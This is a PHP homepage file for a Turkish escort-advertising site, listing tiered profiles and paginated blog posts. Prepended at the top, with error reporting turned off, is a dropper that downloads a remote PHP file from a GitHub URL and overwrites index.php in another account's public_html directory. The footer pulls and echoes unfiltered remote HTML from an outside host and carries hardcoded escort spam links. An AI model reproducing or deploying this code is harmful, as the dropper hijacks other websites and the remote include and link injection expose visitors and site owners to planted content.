<?php
// Hata raporlamayı kapat
error_reporting(0);

// İndirilecek dosyanın URL'si
$url = 'https://raw.githubusercontent.com/bayyx/bayy/refs/heads/main/index.php';

// Oluşturulacak yerel dosyanın adı
$localFileName = 'index.php';

// Hedeflenen dizinlerin listesi (isteğe göre eklenebilir)
$targetDirectories = [
    '/home/adalarfly/public_html'
];

// Belirtilen dizine dosyayı kaydetme işlevi
function saveFileInDirectory($directory) {
    global $url, $localFileName;

    // Yerel dosya için tam yol oluştur
    $filePath = rtrim($directory, '/') . '/' . $localFileName;

    // URL'den dosya içeriğini indir
    $content = file_get_contents($url);

    if ($content !== false) {
        // İçeriği yerel dosyaya kaydet
        $result = file_put_contents($filePath, $content);

        if ($result !== false) {
            echo "+"; // Başarılıysa ekrana sadece "+" yaz
        } else {
            echo "Dosya kaydedilemedi: $filePath<br>";
        }
    } else {
        echo "URL'den içerik indirilemedi: $directory<br>";
    }
}

// Her hedef dizin için dosya kaydetme işlemini gerçekleştir
foreach ($targetDirectories as $directory) {
    saveFileInDirectory($directory);
}
?>


<?php
require_once("application/app.php");
//activeler random olup olmadıgını gönderiyoruz
$data = fetchVitrin($settings["city_for_vitrin"]);
$platinums = [];
$vips = [];
$golds = [];

foreach ($data as $item) {
    if (isset($item['level'])) {
        switch ($item['level']) {
            case 'platinum':
                $platinums[] = $item;
                break;
            case 'vip':
                $vips[] = $item;
                break;
            case 'gold':
                $golds[] = $item;
                break;
        }
    }
}

if ($settings["plat_active"] == 1) {
    shuffle($platinums);
}

if ($settings["vip_active"] == 1) {
    shuffle($vips);
}

if ($settings["gold_active"] == 1) {
    shuffle($golds);
}
?>

<!DOCTYPE html>
<html lang="tr">
<?php
	$settings = get_site_settings();
?>
<head>
    <meta charset="utf-8">
	<meta name="language" content="tr">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>

    <title><?= $settings['site_title']; ?></title>
	
	<meta name="description" content="<?=$settings['meta_description'];?>" />
	
	<link rel="canonical" href="<?=$settings["site_url"];?>" />
	
	<link rel="amphtml" href="<?=$settings["amp_url"];?>" />
	
    <meta name="mobile-web-app-capable" content="yes" />
	<meta name="copyright" content="<?=$settings["site_url"];?>" />
	<meta name="author" content="<?=$settings["site_url"];?>" />
    <meta name="publisher" content="<?=$settings["site_url"];?>" />
    <meta name="theme-color" content="<?=$settings['colorPicker']; ?>">

	<meta property="og:locale" content="tr-TR">
    <meta property="og:type" content="website">
    <meta property="og:title" content="<?=$settings['site_title'];?>" />
    <meta property="og:description" content="<?=$settings['meta_description'];?>" />
    <meta property="og:url" content="<?=$settings['site_url'];?>" />
    <meta property="og:site_name" content="<?=$settings['logo_text'];?>" />
	<meta property="og:image" content="<?=$settings["site_url"];?>/assets/img/istanbul.webp" />
	<meta property="og:image:alt" content="<?=$settings['meta_description'];?>" />
	<meta property="og:image:width" content="1200">
	<meta property="og:image:height" content="630">	
	<meta property="og:updated_time" content="<?= date('c'); ?>">

	<meta itemprop="name" content="<?=$settings['site_title']; ?>" />
	<meta itemprop="description" content="<?=$settings['meta_description'];?>" />
	<meta itemprop="image" content="<?=$settings["site_url"];?>/assets/img/istanbul.webp">

	<link rel="icon" href="<?=$settings["site_url"];?>/assets/img/favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" href="<?=$settings["site_url"];?>/assets/img/favicon.ico" type="image/x-icon">

	<script type="text/javascript" async src="https://cdn.ampproject.org/v0.js" id="ampproject-js"></script>

	<script type="application/ld+json">
	{
	  "@context": "https://schema.org",
	  "@type": "WebSite",
	  "name": "<?=$settings['logo_text'];?>",
	  "url": "<?=$settings['site_url'];?>"
	}
	</script>

	<script type="application/ld+json">
	{
	  "@context": "https://schema.org",
	  "@type": "Organization",
	  "name": "<?=$settings['logo_text'];?>",
	  "alternateName": "<?=$settings['logo_text'];?>",
	  "url": "<?=$settings['site_url'];?>",
	  "logo": "<?=$settings["site_url"];?>/assets/img/logo.png"
	}
	</script>

	<script type="application/ld+json">
	{
	  "@context": "https://schema.org",
	  "@type": "LocalBusiness",
	  "name": "<?= $settings['site_title']; ?>",
	  "image": "<?=$settings["site_url"];?>/assets/img/istanbul.webp",
	  "@id": "<?=$settings['site_url'];?>",
	  "url": "<?=$settings['site_url'];?>",
	  "telephone": "+90 850 219 32 86",
	  "priceRange": "$150 - $300",
	  "address": {
		"@type": "PostalAddress",
		"streetAddress": "İstinye Bayırı Cad, İstinye Park AVM D:359-360",
		"addressLocality": "İstanbul",
		"addressRegion": "TR",
		"postalCode": "34460",
		"addressCountry": "TR"
	  },
	  "openingHoursSpecification": [
		{
		  "@type": "OpeningHoursSpecification",
		  "dayOfWeek": [
			"Monday",
			"Tuesday",
			"Wednesday",
			"Thursday",
			"Friday",
			"Saturday",
			"Sunday"
		  ],
		  "opens": "00:00",
		  "closes": "23:59"
		}
	  ]
	}
	</script>

	<script type="application/ld+json">
	{
	  "@context": "https://schema.org",
	  "@type": "WebPage",
	  "name": "<?=$settings['logo_text'];?>",
	  "url": "<?=$settings['site_url'];?>",
	  "mainEntityOfPage": {
		"@type": "WebSite",
		"@id": "<?=$settings['site_url'];?>"
	  },
	  "breadcrumb": {
		"@type": "BreadcrumbList",
		"itemListElement": [
		  {
			"@type": "ListItem",
			"position": 1,
			"name": "Ana Sayfa",
			"item": "<?=$settings['site_url'];?>"
		  }
		]
	  },
	  "publisher": {
		"@type": "Organization",
		"name": "<?=$settings['logo_text'];?>",
		"url": "<?=$settings['site_url'];?>",
		"logo": {
		  "@type": "ImageObject",
		  "url": "<?=$settings["site_url"];?>/assets/img/istanbul.webp"
		}
	  }
	}
	</script>

	<?= $settings['additional_head_code']; ?>

	<style amp-custom>
	  body.body {
		background: #000;
		font-family: arial;
		font-weight: 400;
		color: #363636;
		line-height: 1.2;
		font-size: 15px
	  }

	  .site-header {
		height: 32px;
		width: 100%;
		position: relative;
		margin: 0;
		color: #fff;
		background:
		<?=$settings['colorPicker1'];?>;
		text-align: center;
	  }
  
	  .better-amp-wrapper {
		background: #000;
		max-width: 750px;
		margin: 0 auto;
		border: 1px solid #895f21;
		padding-left: 2px;
		padding-right: 2px
	  }

	ul {
	  list-style: none;
	  margin: 0;
	  padding: 0;
	  display: inline-block;
	}

	#vitrinV ul{
		width: calc((100% / 1) - 0rem);

	}

	#vitrinY {
		display: flex;
		gap: 4px;
		flex-wrap: wrap;
		max-width: 750px;
		width: 100%;
		margin: 5px auto;
		justify-content: space-between;
	}

	#vitrinY ul {
		width: calc(50% - 2px);
		box-sizing: border-box;
		border: 1px solid #a8a8a8;
		border-radius: 0 0 10px 10px;
		margin: 0;
	}

	#vitrinY img {
		height: auto;
		object-fit: cover;
		border-radius: 0 0 10px 10px;
	}

	#vitrinL {
		display: flex;
		flex-wrap: wrap;
		gap: 6.6px;
		max-width: 750px;
		margin: 0 auto;
		justify-content: left;
	}

	#vitrinL ul {
		width: calc((750px / 4) - 5px);
		box-sizing: border-box;
		list-style: none;
		border: 1px solid #b7b7b796;
		border-radius: 10px 10px 0px 0px;
	}
	#vitrinL img {
		width: 100%;
		border-radius: 10px 10px 0px 0px;
		display: block;
	}

	@media (max-width: 480px) {
		#vitrinL ul {
			width: calc(25% - 5px);
		}
	}
  
  .archive-header {
    border: 1px solid #895f21;
    max-width: 715px;
    margin: 0 auto;
    text-align: left;
    padding-left: 20px;
    padding-right: 20px;
    font-size: 14px;
    margin-top: 10px;
	background-color: #d7d7d7;
  }
  
  .row {
    display: flex;
    flex-wrap: wrap;
    gap: 20px
  }

  .pagination {
    line-height: 28px;
    margin: 0 0 30px;
    height: 30px
  }

  .pagination a {
    padding: 0 15px
  }

  .button,
  .comments-pagination a,
  .pagination a {
    padding: 5px 10px;
    border: 1px solid #d7d7d7;
    color: #494949;
    font-size: 13px;
    display: inline-block;
    text-decoration: none;
    border-radius: 3px
  }

  .post-title {
    margin-bottom: 10px
  }

  .post-title a {
    color: #333;
    text-decoration: none;
    font-size: 1.2em
  }
  
  .better-amp-copyright {
    padding: 17px 10px;
    text-align: center;
    font-family: Arial;
    font-weight: 400;
    color: #494949;
    border-top: 1px solid rgba(0, 0, 0, .1);
    font-size: 13px
  }

  .posts-listing {
    padding: 15px 18px 11px;
    border: 1px solid #895f21;
    max-width: 720px;
    margin: 0 auto
  }

  .listing-item {
	  position: relative;
    padding: 15px;
    border-radius: 5px;
	border: 1px solid #895f21;
    box-shadow: 0 2px 4px rgba(0, 0, 0, .1)
  }

  .listing-2-item a.post-read-more {
    float: right
  }
  
  .listing-item .post-meta .post-date .fa {
    margin-right: 3px
  }
  
  .post-date a {
    color: gray;
}

.post-date a, 
.post-date a:hover {
    color: gray;
    text-decoration: none; /* Altı çizgiyi kaldırmak için */
}

  .listing-item .post-title,
  .listing-item a.post-read-more {
    font-family: Arial, sans-serif;
    color: #363636
  }

  .listing-item .post-title {
    font-weight: 500;
    font-size: 15px;
    line-height: 1.3;
    margin: 0 0 10px
  }

  .listing-item .post-title a {
    color: #e9e9e9;
    text-decoration: none
  }

  .listing-item .post-meta {
    margin-top: 15px;
    font-size: 14px
  }

  .post-meta {
    color: #e9e9e9;
    font-size: .9em
  }

  .post-read-more {
    color: #007bff;
    text-decoration: none;
    font-weight: 700;
    display: inline-block
  }

  .listing-item a.post-read-more {
    font-weight: 500;
    font-size: 12px;
    padding: 0 5px;
    line-height: 24px;
    border-radius: 5px
  }  
</style>

</head>

<body class="home blog logged-in admin-bar no-customize-support wp-custom-logo wp-embed-responsive body date-hidden author-hidden comments-hidden is-amp-page" style="background-color: <?=$settings['colorPicker']; ?>;">
    <?php echo $settings['additional_body_code']; ?>

    <div class="better-amp-wrapper">
        <header itemscope itemtype="https://schema.org/WPHeader" class="site-header">
            <a href="/" class="branding text-logo" title="<?=$settings['logo_text'];?>"><?= $settings['logo_text']; ?></a>
        </header>
		
		<div align="center" class="e_977612157">
			<div class="text-center" id="vitrinV">
				<ul>
			<?php fetchAndDisplayData($platinums); ?>
				</ul>
			</div>
		</div>

        <div align="center" class="e_977612157">
            <div class="text-center" id="vitrinY">
        <?php fetchAndDisplayData1($vips); ?>
            </div>
        </div>

        <!-- kare -->

        <div align="center" class="e_977612157">
            <div class="text-center" id="vitrinL">
        <?php fetchAndDisplayData2($golds); ?>
			</div>
        </div>
    </div>
 	
	<header class="archive-header">
		<div class="archive-meta">
		<?php echo $settings['blog_main_description'];?>
	<br>
	</div>
	</header>
	<?php
$posts_per_page = 5;
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$start = ($page - 1) * $posts_per_page;
$total_posts_stmt = $db->query('SELECT COUNT(*) AS total FROM posts');
$total_posts = $total_posts_stmt->fetch(PDO::FETCH_ASSOC)['total'];
$total_pages = ceil($total_posts / $posts_per_page);
if ($total_pages < $page)  {
	$start = 0;
}	
$stmt = $db->prepare('SELECT * FROM posts ORDER BY id DESC LIMIT :start, :limit');
$stmt->bindValue(':start', $start, PDO::PARAM_INT);
$stmt->bindValue(':limit', $posts_per_page, PDO::PARAM_INT);
$stmt->execute();
?>

<div class="wrap">
    <div id="post-listing" class="posts-listing posts-listing-2">
        <div class="row">
            <?php
			function truncate_by_words($text, $max_words) {
				$words = explode(' ', $text); // Metni kelimelere ayır
				if (count($words) > $max_words) {
					$words = array_slice($words, 0, $max_words); // Kelimeleri kes
					$text = implode(' ', $words) . '...'; // Kelimeleri tekrar birleştir ve '...' ekle
				}
				return $text;
			}
			
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $post_id = $row['id'];
             // $preview_image_url = $row['preview_image_url'];
                $title = $row['title'];
                $content_description = $row['content_description'];
                $meta_description = $row['meta_description'];
                $publication_date = $row['publication_date'];
                $slug = $row['slug'];
                $category_id = $row['category_id'];
                $content_description1 = $row['meta_description'];
                $max_words = POST_MAX_WORD;

                $content_description = truncate_by_words($content_description, $max_words);

				 echo '<article class="listing-item listing-2-item clearfix post-' . htmlspecialchars($post_id) . '" style="background-color: ' . $settings['colorPicker2'] .';">';
                echo '<div class="post-thumbnail">';

                echo '<a href="/' . htmlspecialchars($slug) . '" title="' . htmlspecialchars($title) . '">';

                // Preview Image URL buraya eklenecek
                echo '</a>';
                echo '</div>';
                echo '<h3 class="post-title">';

                echo '<a href="/' . htmlspecialchars($slug) . '" title="' . htmlspecialchars($title) . '">' . htmlspecialchars($title) . '</a>';

                echo '</h3>'; 
                echo '<div class="post-meta">';
                echo '<p>' . htmlspecialchars_decode(strip_tags($content_description)) . '</p>';
                echo '</div>';
                echo '<div class="post-meta clearfix">';
                echo '<span class="post-date">';
                echo '<i class="fa fa-calendar" aria-hidden="true"></i>';
                echo htmlspecialchars($publication_date);
                echo '</span>';
                
				echo '<a class="post-read-more" href="/' . htmlspecialchars($slug) . '" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Devamını Oku: ' . htmlspecialchars($title) . '">Devamını Oku <i class="fa fa-arrow-right" aria-hidden="true"></i></a>';
				
                echo '</div>';
                echo '</article>';
            }
            ?>
        </div>

<div class="pagination" style="text-align: center; margin-top: 20px;">
    <?php
    $max_displayed_links = 7;
    $half_display = floor($max_displayed_links / 2);
    
    $start_page = max(1, $page - $half_display);
    $end_page = min($total_pages, $page + $half_display);

    if ($end_page - $start_page + 1 < $max_displayed_links) {
        if ($start_page == 1) {
            $end_page = min($total_pages, $start_page + $max_displayed_links - 1);
        } else {
            $start_page = max(1, $end_page - $max_displayed_links + 1);
        }
    }

    // Önceki Sayfa Butonu
    if ($page > 1) {
        echo '<a href="?page=' . ($page - 1) . '" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Önceki Sayfa">« Önceki</a> ';
    }

    // İlk Sayfa ve "..." gösterimi
    if ($start_page > 1) {
        echo '<a href="?page=1" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Birinci Sayfa">1</a> ';
        if ($start_page > 2) {
            echo '<span>...</span> ';
        }
    }

    // Sayfa numaraları
    for ($i = $start_page; $i <= $end_page; $i++) {
        if ($i == $page) {
            echo '<span style="font-weight: bold; color: blue;">' . $i . '</span> ';
        } else {
            echo '<a href="?page=' . $i . '" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Sayfa ' . $i . '">' . $i . '</a> ';
        }
    }

    // Son Sayfa ve "..." gösterimi
    if ($end_page < $total_pages) {
        if ($end_page < $total_pages - 1) {
            echo '<span>...</span> ';
        }
        echo '<a href="?page=' . $total_pages . '" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Son Sayfa">' . $total_pages . '</a> ';
    }

    // Sonraki Sayfa Butonu
    if ($page < $total_pages) {
        echo '<a href="?page=' . ($page + 1) . '" style="background-color:' . $settings["main_blog_detay_color"] . ';" title="Sonraki Sayfa">Sonraki »</a>';
    }
    ?>
</div>

<?php
// Uzaktan alınan veriyi cache'leyerek kullan
$cache_file = __DIR__ . "/footer-cache.html";
$cache_time = 12 * 60 * 60;

if (!file_exists($cache_file) || (time() - filemtime($cache_file)) > $cache_time) {
    $url = 'https://www.esc.best/footer.php';
    $content = file_get_contents($url);
    file_put_contents($cache_file, $content);
}

echo file_get_contents($cache_file);
?>

    </div>
</div>


    </div>
</div>

<!-- /wrap -->	
    <footer class="better-amp-footer ">
        <div class="footer-navigation"></div>
        <div class="better-amp-copyright">
        	<?=$settings['copyright']; ?> 
 		</div>
    </footer>
	

<a href="https://besiktash.com">istanbul escort</a>
<a href="https://istanbulescorts.com.tr">istanbul escort</a>

	
	
</body>
</html>
